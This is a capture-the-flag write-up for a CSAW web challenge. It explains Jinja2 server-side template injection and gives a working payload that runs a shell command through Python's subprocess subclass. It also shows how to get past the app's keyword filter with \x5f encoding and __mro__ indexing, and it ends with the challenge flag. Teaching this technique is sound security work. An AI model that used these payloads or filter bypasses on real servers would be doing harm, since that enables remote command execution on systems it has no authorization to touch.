# Ninja
## Description
Hey guys come check out this website I made to test my ninja-coding skills.  
http://web.chal.csaw.io:5000

## Solution
This website has Server-side Template Injection (SSTI) vulnerability.

### Some fundamentals
Some key points to exploit jinja2 SSTI:
- `__mro__` (**method resultion order**) to access base classes of the current class. In other words, we use `__mro__` to **go up** the inheritance tree.
- `__subclasses__()` to list all child classes of the current class. In other words, we use `__subclasses__()` to **go down** the inheritance tree.
- The `object` class which is the **root** of all objects in Python; therefore, once we can access the `object` class, we can call every object defined in the current file.

### Initial payload
I have crafted a small program in my machine to test the payload and this one is what I want:
```python
self.__class__.__base__.__subclasses__()[279]()(["cat","flag.txt"],shell=True,stdout=-1).communicate()[0]
```

### Bypass filters
There is a filter in this application:
```
Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base
```

First, the `_` character is significantly important for SSTI exploitation. So in order to bypass this, I found 2 ways:
- Encode `_` as `\x5f` (which is the Unicode encoding for `_`). However, to access a property or method using `string` name, I need to use `[]` rather than `.`.
- Use the `attr()` to get an attribute. Furthermore, we can use `|join` which will be handy in some cases when we want to concatenate strings.

Second, I need to bypass the `base` filter. To do that, I can use `__mro__[1]`.

With these information, my payload becomes:
```python
self['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[279](['cat','flag.txt'],shell=True,stdout=-1).communicate()[0].decode('utf-8')
```
> Flag: `flag{m0mmy_s33_1m_4_r34l_n1nj4}`.
